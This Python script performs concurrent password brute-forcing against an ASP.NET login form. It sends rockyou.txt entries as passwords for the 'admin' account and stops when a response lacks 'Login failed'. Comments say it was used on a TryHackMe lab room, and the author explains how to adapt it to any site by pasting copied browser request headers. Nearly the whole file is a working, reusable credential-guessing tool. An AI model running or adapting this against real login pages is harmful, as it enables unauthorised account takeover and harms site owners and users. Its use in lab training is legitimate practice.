import aiohttp
import asyncio
import json
import time
import os


"""
v1.0.1
tested in python 3.10.6
pip3 install aiohttp
"""

async def post(session, index, FUZZ, filter, semaphore):
    """
    in your browser inspect element, then get the request and copy it as curl.
    then go to https://curlconverter.com/python/

    get the body and the headers, replace the previous below
    """
    payload = {
        '__VIEWSTATE': 'FtDWXBorgd5PnS3Zm/OOFb8G6Z+z2Di8+D6C2nXaT0BXEV77JRgpiq0q4001bzaa1xC9v1tu0/eGq7NVZPeYx+rPqeBIUqcVJ5jflfJ6itd1+jhXLZQ/vl8xJBL355kPh4lIx6Bl8b+Uj6EV7eNFRo5k0V9CnfiEjXF64Dt7AzovFM5b',
        '__EVENTVALIDATION': 'WdQGNjnu0klLhxIo2w/iePIaOG7I6V4l/dJujt8W5v5HUCOWh68wRWrYoiMhQw1SK5jE/bSl+bj0ptVZ1Iq4eoV/5WlyvRLnmJ/kEXa7S8CyBGEUisnGk1u0rXPd/zQhXbzFNQHnRYefaH3240eaNeKrgUR+iyALg9mq63v+/PlaUQzn',
        'ctl00$MainContent$LoginUser$UserName': 'admin',
        'ctl00$MainContent$LoginUser$Password': FUZZ,
        'ctl00$MainContent$LoginUser$LoginButton': 'Log in',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://10.10.151.23',
        'Connection': 'keep-alive',
        'Referer': 'http://10.10.151.23/Account/login.aspx?ReturnURL=%2fadmin%2f',
        'Upgrade-Insecure-Requests': '1',
        'Priority': 'u=1',
    }
    """
    HTTP FORMS
    'Content-Type': 'application/x-www-form-urlencoded',
    should use dictionary as payload

    REST API
    'Content-Type': "application/json",
    use json.dumps(payload) before
    """
    
    # CHECK PAYLOADS
    if headers.get('Content-Type') == 'application/x-www-form-urlencoded':
        data = payload
    if headers.get('Content-Type') == 'application/application/json':
        data = json.dumps(payload)

    async with semaphore:
        try:
            async with session.post(url, data=data, headers=headers) as response:
                text = await response.text()
                if filter in text:
                    response.status = 401
                    status = 'Failed'
                else:
                    status = 'CHECK THIS!'
                    print(text)
                    print(f"FUZZ: {FUZZ}")
                    os._exit(1)  # Exit the program immediately

                print(index, response.status, status)
                return response.status
        except Exception as e:
            print(f"[-] Request failed: {e}")
            return None

def read_file_to_array(file_path):
    expanded_path = os.path.expanduser(file_path)
    try:
        with open(expanded_path, 'r', encoding='latin-1') as file:
            lines = file.readlines()
        return [line.strip() for line in lines]
    except Exception as e:
        print(f"Error reading file: {e}")
        return []

async def main():
    file_path = "~/wordlists/rockyou.txt"
    password_list = read_file_to_array(file_path)
    filter_string = "Login failed"
    concurrent_limit = 50
    semaphore = asyncio.Semaphore(concurrent_limit)

    tasks = []
    async with aiohttp.ClientSession() as session:
        for i in range(0, len(password_list), concurrent_limit):
            batch = password_list[i:i + concurrent_limit]
            for j, password in enumerate(batch):
                task = asyncio.ensure_future(post(
                    session=session, index=i + j, FUZZ=password, filter=filter_string, semaphore=semaphore
                ))
                tasks.append(task)

            responses = await asyncio.gather(*tasks)
            # for response in responses:
            #     if response:
            #         if response // 100 == 2:
            #             print("Success:", response)
            #         elif response // 100 == 5:
            #             print("Server error:", response)
            #         elif response // 100 == 4:
            #             print("Client error:", response)
            tasks = []  # Clear tasks for the next batch

if __name__ == "__main__":
    # https://tryhackme.com/r/room/hackpark
    # this is the room we tried this
    url = "http://10.10.236.80/Account/login.aspx?ReturnURL=%2fadmin%2f"
    
    start_time = time.time()
    print("[+] Starting requests")
    asyncio.run(main())
    print("--- %s seconds ---" % (time.time() - start_time))
